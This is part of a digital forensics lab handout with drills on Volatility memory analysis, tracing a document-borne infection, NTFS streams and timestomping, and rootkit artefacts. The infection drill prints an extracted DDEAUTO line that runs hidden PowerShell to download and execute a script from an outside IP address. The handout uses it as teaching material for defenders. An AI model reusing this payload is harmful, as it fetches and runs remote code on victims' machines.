## 4. Drill-E9 - Processes, DLLs and sockets from memory

**35 minutes. Runs on kali. Data: jo-2009.mem.**

**Objective.** Recover processes, DLLs and sockets from a memory image.

**Run this.**

```bash
vol -q -f /labs/work/jo-2009.mem windows.pslist
vol -q -f /labs/work/jo-2009.mem windows.pstree
vol -q -f /labs/work/jo-2009.mem windows.cmdline | head -20
```

**What good looks like.**

```text
Volatility 3 Framework 2.28.2
PID   PPID  ImageFileName   Offset(V)   Threads  Handles  CreateTime
4     0     System          0x82fc89c8  58       526      N/A
880   4     smss.exe        0x82e067c8  3        19       2009-11-13 04:48:58 UTC
928   880   csrss.exe       0x82d29a58  13       664      2009-11-13 04:49:00 UTC
952   880   winlogon.exe    0x82d2f208  18       643      2009-11-13 04:49:00 UTC
996   952   services.exe    0x82e24d10  16       358      2009-11-13 04:49:01 UTC
1008  952   lsass.exe       0x82e0bda0  20       353      2009-11-13 04:49:01 UTC
896   996   avgfws9.exe     0x828266a0  30       861      2009-11-13 04:49:28 UTC

pstree adds the offset and the full path per process, and cmdline gives the arguments. The learner
must pick one process that does not belong and say why.
```

**Save this evidence:** `pslist, pstree, cmdline output` in `/labs/reports/`.

**Pass criterion.** Parent and child are linked, and the odd command line is named.

**Common mistake.** Reading pslist alone and missing a process hidden from the list.

## 5. Drill-E10 - Trace a document borne infection

**30 minutes. Runs on kali. Data: authored macro document.**

**Objective.** Trace a document borne infection from file to execution.

**Run this.**

```bash
oleid /labs/work/samples/invoice-dde.docx
olevba /labs/work/samples/invoice-dde.docx
unzip -p /labs/work/samples/invoice-dde.docx word/document.xml | grep -o 'DDEAUTO[^<]*'
```

**What good looks like.**

```text
oleid: MS Word 2007+, OpenXML, VBA Macros No, XLM Macros No, External Relationships 0.
olevba: No VBA or XLM macros found.
unzip: DDEAUTO c:\windows\system32\cmd.exe "/k powershell -w hidden -c IEX (New-Object
Net.WebClient).DownloadString('http://45.125.66.32:2917/a.ps1')"

The lesson is the first two results: the tool says clean, and the payload is there. Absence of
macros is not absence of a vector.
```

**Save this evidence:** `vector chain` in `/labs/reports/`.

**Pass criterion.** Every link in the chain is an artefact, not an assumption.

**Common mistake.** Stopping at the macro and never linking it to the execution.

## 6. Drill-E11 - Spot alternate streams, timestomping and erasure

**30 minutes. Runs on kali. Data: ntfs1.raw, converted from the E01.**

**Objective.** Find alternate data streams, timestomping and anti forensic deletion.

**Run this.**

```bash
fls -r /labs/work/disk/ntfs1.raw | grep ':' | head
fls -r -m /labs/work/disk/ntfs1.raw 2>/dev/null | head -5
icat /labs/work/disk/ntfs1.raw 46-128-1 | head -5
```

**What good looks like.**

```text
Evidence of named streams from the fls output, one file whose timestamps disagree with
its content, and the EFS key information file as an example of a control that hides content.
```

**Save this evidence:** `artefact list` in `/labs/reports/`.

**Pass criterion.** Stream names are quoted, and one timestamp inconsistency is shown with both values.

**Common mistake.** Reading modification time as creation time.

## 7. Drill-E12 - Find rootkit hiding artefacts

**30 minutes. Runs on kali. Data: jo-2009.mem.**

**Objective.** Identify rootkit hiding evidence in a memory image.

**Run this.**

```bash
vol -q -f /labs/work/jo-2009.mem windows.modules | head -20
vol -q -f /labs/work/jo-2009.mem windows.ssdt | head -20
vol -q -f /labs/work/jo-2009.mem windows.malfind | head -30
```

**What good looks like.**

```text
malfind returns two regions on this image:
928  csrss.exe     0x7f6f0000  0x7f7effff  Vad  PAGE_EXECUTE_READWRITE
952  winlogon.exe  0x00580000  0x0059ffff  Vad  PAGE_EXECUTE_READ

ssdt lists every entry against ntoskrnl with no foreign module, so no SSDT hook is present.

The teaching point is that neither malfind hit is a hook: csrss and winlogon are the classic
false positives on an XP image. A finding needs more than a protection flag.
```

**Save this evidence:** `hook evidence` in `/labs/reports/`.

**Pass criterion.** The finding names the baseline it was compared against.

**Common mistake.** Calling a hooked entry malicious without a clean baseline.

## Handover brief

Two minutes at the end. Each learner answers three questions out loud, in 90 seconds:

1. **Finding.** One sentence a client would understand. No tool names.
2. **Limitation.** What this evidence cannot tell you, and why.
3. **Next step.** The single next action you would take, and who authorises it.

Record the three answers in `/labs/reports/` as the lab's closing note. This is group A4, record keeping, in practice.
